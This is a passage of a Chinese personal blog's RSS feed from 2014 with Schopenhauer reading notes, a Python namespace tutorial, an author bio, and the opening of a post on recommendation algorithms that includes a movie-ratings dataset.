&lt;p&gt;不少人写作就是为了获得金钱或者谋取职位。所以,这样写出来的东西不仅毫无用处,而且是绝对有害的。我们当今十分之九的文字作品除了蒙骗读者,从其口袋中抠出几个铜子以外,再没有别其他目的。为此共同的目的,作者、出版商、评论家绝对是沆瀣一气、狼狈为奸。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每一本重要的书籍都必须一气呵成连续读上两遍。原因之一是在阅读第二遍的时候,我们会更好地理解书中内容的整体关联,而只有知道了书的结尾才会明白书的开头;原因之二就是在第二次阅读的时候,我们的心境、情绪与在第一次阅读时已经有所不同。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;几乎所有真正的人类启蒙者、几乎所有在各个学问和艺术上的大师都是殉道者&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;论历史&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;诗歌、文学艺术比历史更具哲理和价值  --亚里士多德&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;科学把数不胜数的事物区别开来,分门别类,次第纳入种、类的概念之下。这样,科学就为我们打开了认识普遍事物和特殊事物之门。在科学里,正确掌握了普遍性的概念以后,我们就
可以确切断定所出现的个别、特殊的情形。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史只能直接领会单一、个别的东西。这样,历史就好比是沿着经验的实地匍匐而行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史教导我们说,在每一不同的时间都有不同的东西,但哲学则着力帮助我们获得这一见解:在任何时候——过去、现在、将来——都只是同一样的东西&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;历史之于人类就犹如理性机能之于个人。也就是说,正是得益于人的理性机能,人类才不仅不会像动物那样局限于狭窄、直观所见的现在,而且还能够认识到大为扩张了范围的过去——它与现在相连接、也是现在所由出。人类也只有经此方式才可以真正明白现在本身,甚至推论将来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;论文学&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我认为,对文学最简单和最确切的定义就是:一门借用字词把想象力活动起来的艺术。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;因为读者的头脑想象力就是文艺作用的对象——文艺以此展现形象和画面&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;作者对人生世事的了解到底是深刻抑或肤浅,决定了他们的文学作品的好坏。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个作家肯定会视自己与最好的作家差不了多少,因为他在最好作家的图像里所认出的东西不会多于从自己塑造的图像所认出的,亦即与他在大自然中所见的一样多。这是因为他的目光无法看得更深。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但最好的作家之所以认出自己就是最好的作家,原因就在于他看到了别人的眼光是多么的肤浅,在别人所见的后面,却隐藏着如此之多别人无法重现的东西,因为别人根本就看不见这些东西;他也看到了自己的眼光和图像却深远得多。正如一个身高六英尺的人不可能不注意到自己高出常人一截。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;虚假的谦虚不会为我平添声价,我知道自己的价值,也相信人们对我的看法  --高乃依&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只有欺世盗名者才是谦虚的。  --歌德&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;嫉妒煎熬着内心,其百般滋味就像打翻了五味瓶。能把拥有出众个人素质的人扫荡干净,或者干脆连根拔除,那该有多好!但如果真要放他们一条生路的话,那条件就是这些家伙必须藏起自己的优点,要矢口否认、甚至诅咒摒弃那些使他们出类拔萃的东西。这就是人们交口赞扬谦虚的缘由。而一旦这些赞扬谦虚的人有机会把别人的长处扼杀于萌芽之中,或者至少阻止其露面,以免被人们所知晓&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;文学创作的天赋才能真正只在青年期开花,对诗歌、文学的感受在青年期也经常是狂热的。青年人忘情于诗句文字,内容平平也能够读出味道。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在文学里,生活饶有趣味而又没有痛苦;但在现实中,生活要是没有痛苦的话,那就是乏味、不过瘾的,而一旦生活变得有趣、过瘾,那就不会没有痛苦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;进入文学世界早于进入现实生活的年轻人会要求在现实生活中得到他们只能在文学里面才可以得到的东西。才具出众的青年在现实生活中痛感不适,其主要原因正在于此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;韵律和韵脚既是镣铐,也是面纱——诗人戴上这层面纱以后,就可以允许自己以平常不敢采用的方式说话,而正是这一点特质取悦于读者。也就是说,诗人对说出的句子只负有一半的责任,韵律和韵脚则必须负上另一半责任。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;韵律、韵脚所特有的、秘密诱惑力实在无法抵挡&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;让听(读)者觉得这里面所表达的思想就好像注定非这样表达不可;甚至所表达的思想就好像已预先定型在这语言里面了,诗人所做的只是把这已预先固定下来的句子找出来而已。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;据以识别真正诗人的最直接标志就是他们诗句中韵脚来得绝不勉强,押韵的句子得来全不费工夫,就像拜神灵所赐一样。诗人的思想降临之时就已是配好了韵脚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;相比之下,那些平庸的诗人却费力为其思想找出韵脚;而拙劣的诗作者则为韵脚而寻找合适的思想。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们通常都可以从一些押韵的诗句中发现哪两句韵诗是先有要表达的思想,哪两句却是预定了韵脚,然后按图索骥找出要表达的意思。艺术就在于把后一种情形掩藏起来,以免显得写作这一类诗句纯粹就是按预定的韵脚填词而已。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一如我们面对大自然的壮美景色时,会不再全神贯注于意欲的利益,而转持直观的态度,同样,面对悲剧中的苦难时,我们也会不再专注于生存意欲。也就是说,在悲剧里,生活可怕的一面摆在了我们的眼前:人类的痛苦和不幸,主宰这生活的偶然和错误,正直者所遭受的失败,而卑劣者的节节胜利......。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;喜剧务必要在皆大欢喜的一刻匆匆落幕,这样,观众才不至于看到接下来要发生的事情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;论写作和文体&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;动笔写作的有两种人:一种人是因为有内容要写出来;另一种人则是为写作而写作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;第一种写作者有了一些思想,或者积累了某些经验;这些东西在他们看来值得传达给别人。第二种人需要钱,所以,他们写作就是为了钱。这第二种人思考是为了有东西可写。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一大群拙劣的写作者纯粹是以读者大众的愚蠢养活自己,因为读者竟然蠢至非最新印刷的东西不读。这群写作者就是“日报记者”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那些想就某一话题求教的人,千万不要匆忙拿起讨论这一话题的最新出版的书,满以为科学总在进步,而新书的作者肯定是利用了之前的旧著。事实的确是这样,但这到底是怎样的一种利用啊!新书的作者经常并不曾彻底理解前贤的作品,但却又不愿意直截了当沿用旧著的原话。所以,那本来表达得更好和更加清晰的话语只能被他们越改越糟、弄巧成拙。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;宁可购买二手书,也不要阅读内容方面的二手书。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;读者们更多阅读的是关于歌德的书,而不是歌德写出的书;探究浮土德的传说比研读《浮士德》长诗更来劲。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;几乎任何时候,无论是在艺术还是在文学当中,都会有一些错误的基本观点、错误的方法和格调流行开来并受到人们的赞扬。思想平庸的人就会争相仿效这些东西,而有洞察力的人则会看穿和鄙视这些东西,不为时尚所动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个人的文体会显示出这个人所有思想的形式特性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;那些思想平庸的作者完全不敢下定决心直写自己的所思,因为他们怀疑这样写出来的东西会显得简单、幼稚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他们力图显得比实际上想得更多、想得更深。所以,他们在表达自己的想法时,喜用生僻的字眼、复杂的长句、时髦和牵强的短语。那些套叠的句子拐弯抹角、闪烁其词。这一类作者就在既想传达这些思想、又想掩藏起这些思想之间左右为难。他们很想把自己的思想装饰一番,以显示出一副渊博、高深的样子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;-- 摘录至P75&lt;/h4&gt;
&lt;p&gt;waiting...&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-08:book-ArthurSchopenhauer.html</guid><category>book</category></item><item><title>python笔记之命名空间总结</title><link>/learning%20python%203.html</link><description>&lt;p&gt;这两天阅读github上一些项目源码时，发现运算符重载部分不够熟悉，于是又翻了一遍《learning python》。&lt;br /&gt;
这是第三遍阅读，第一次是初学python时，第二次是为了给学习django清除障碍。这本书真是难得的佳作，极其清晰明了的教学风格，读来就像小说般流畅，每次重读总有收获。&lt;br /&gt;
既然开始写博客了，就好好做好读书笔记吧，方便自己日后的查阅，也方便他人。&lt;/p&gt;
&lt;p&gt;在python中，变量名的赋值场所极其重要，这完全决定了变量名所在的作用域或对象。&lt;br /&gt;
直接上代码吧，这个例子很好地对python的命名空间概念做了总结：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;#manynames.py&lt;/span&gt;
    &lt;span class="c1"&gt;#解释命名空间对象&lt;/span&gt;
    &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;              &lt;span class="c1"&gt;#global ， X or manynames.X&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;                
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt;         

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;g&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;          &lt;span class="c1"&gt;# 函数本地作用域 &lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;

    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;33&lt;/span&gt;          &lt;span class="c1"&gt;# 类属性，C.X&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;m&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;44&lt;/span&gt;      &lt;span class="c1"&gt;# 函数本地作用域&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;55&lt;/span&gt; &lt;span class="c1"&gt;# 实例属性(instance.X)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;从上到下，这里对X的赋值语句会产生：模块属性（11）,本地变量（22）,类属性（33）,方法中的本地变量（44）以及实例属性（55）&lt;br /&gt;
这个例子把命名空间的几种情况集合起来了。&lt;br /&gt;
我们运行一下，就一目了然了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# manynames.py ,接上面&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt;     &lt;span class="c1"&gt;#11&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c1"&gt;#11&lt;/span&gt;
    &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c1"&gt;#22&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt;     &lt;span class="c1"&gt;#11&lt;/span&gt;

    &lt;span class="n"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;   
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="c1"&gt;#33&lt;/span&gt;

    &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="c1"&gt;#55&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt;   &lt;span class="c1"&gt;#33&lt;/span&gt;

    &lt;span class="c1"&gt;#print C.m.X[26]    #失败:只在函数内可见,只有当函数调用时，X才会存在与内存中&lt;/span&gt;
    &lt;span class="c1"&gt;#print f.X  #失败:只在函数内可见&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们再来做个模块间读取变量的实验：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;manynames&lt;/span&gt;

&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;66&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt;         &lt;span class="c1"&gt;#66&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;manynames&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt;       &lt;span class="c1"&gt;#11&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;manynames&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#11&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;manynames.f()打印的是manynames中的X而不是本文件中的X。&lt;br /&gt;
这里说明作用域总是由源代码中的赋值语句的位置决定的。&lt;/p&gt;
&lt;p&gt;还有再说一点，就去吃饭啦～实际项目在，每个变量不应该用通样的变量名！！&lt;/p&gt;
&lt;p&gt;走起&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-08:learning python 3.html</guid><category>python</category></item><item><title>aboutme_old</title><link>/aboutme_old.html</link><description>&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;三尺微命，一介书生&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一个不切实际的人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;希望成为一个有趣的人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;喜欢阅读，诗词，游山玩水&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;当然也热爱编程，热爱开源，热爱python，正在学习lisp&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大学四年，第一年读了一些书，写过一些小说，百来首诗词，一些杂文，想着将来成为一名业余作家，读书，写作，流浪。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大二时再读大一写下的东西，觉得很是羞愧，于是决定先不动笔，用心读书，这一年喜欢周国平，叔本华，大卫休谟，罗素，维特根斯坦。思路渐渐清晰，学会理性思考，开始爱上阅读。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大三逛图书馆科技区，偶然的机会，接触head first系列图书，开始对计算机感兴趣，邂逅web，邂逅python，邂逅linux，邂逅开源，喜欢上这些东西，近乎废寝忘食。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;四年里，喜欢过一个妹子，写了两百来首诗词，去过一些地方，读过不少好书，崇拜几个作家，结交了几个重要的朋友，开发过几个小网站，申请两份专利，一篇未完成的长篇小说。接下来的时间 阅读，写作，编程，游山玩水&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;目前在南京从事自己喜欢的IT方面的工作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;喜欢这个城市，计划每周末都四处逛逛，如果你也喜欢四处闲逛，恰好路过这个城市，我乐意做导游～&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 07 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-07:aboutme_old.html</guid><category>随笔</category></item><item><title>python算法学习之推荐系统</title><link>/learning%20python%202.html</link><description>&lt;p&gt;之前一直对算法不太感冒，感觉既乏味又务虚，除了用来考试/面试，实在找不出其他用途。毕竟平时实际项目中也不常遇到需要深入理解算法的地方。加上教科书的影响，对算法一直敬而远之。&lt;br /&gt;
直到开始阅读《集体智慧编程》。&lt;br /&gt;
才发现原来这也挺好玩的呀。&lt;br /&gt;
遂决定好好学习。  &lt;/p&gt;
&lt;p&gt;长期以来，受惠于推荐系统，日久生情，对此产生了兴趣。比如豆瓣能根据你的浏览记录（评分记录）推荐你可能喜欢的小组，可能喜欢的文章，可能感兴趣的活动。而且往往还真能猜准～&lt;br /&gt;
无觅阅读的文章推荐也很和我胃口，不必花太多时间就能轻松找到喜欢的文章。&lt;br /&gt;
这类系统能分析出你的&lt;code&gt;品味&lt;/code&gt;，它居然知道我的品味！！想想都令人兴奋，系统居然像你的知音一样知道你的品味！！&lt;/p&gt;
&lt;p&gt;如果不觉得一件东西有趣，实在很难硬着头皮学下去。既然发现它很好玩，想无视它，也难了。&lt;br /&gt;
那就开始我们的算法旅程吧。&lt;br /&gt;
从推荐系统开始～  &lt;/p&gt;
&lt;p&gt;这组文章偏向于总结吧，不是作为入门指南，如果你也对这类算法感兴趣，推荐去阅读《集体智慧编程》，而不是看博客。
这组文章使用的算法皆来自《集体智慧编程》，我只是做些摘录，为了方便日后使用.你也可以使用 这些代码，至于使用过程中你要受到哪些限制，请参考原书的申明部分。 &lt;/p&gt;
&lt;h3&gt;实例学习&lt;/h3&gt;
&lt;p&gt;在这个实例里，我们想知道用户的兴趣偏好（口味）。&lt;br /&gt;
情景是这样的：几位用户看过几部电影，他们对这些电影进行了评分，我们拿到了这组数据,r如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="n"&gt;critics&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Lisa Rose&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Lady in the Water&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;Just My Luck&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;You, Me and Dupree&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
     &lt;span class="s1"&gt;&amp;#39;The Night Listener&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;Gene Seymour&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Lady in the Water&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
     &lt;span class="s1"&gt;&amp;#39;Just My Luck&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;1.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;5.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The Night Listener&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
     &lt;span class="s1"&gt;&amp;#39;You, Me and Dupree&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; 
    &lt;span class="s1"&gt;&amp;#39;Michael Phillips&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Lady in the Water&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The Night Listener&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;Claudia Puig&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Snakes on a Plane&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Just My Luck&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;3.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;The Night Listener&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;4.5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Superman Returns&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;4.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
     &lt;span class="s1"&gt;&amp;#39;You, Me and Dupree&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
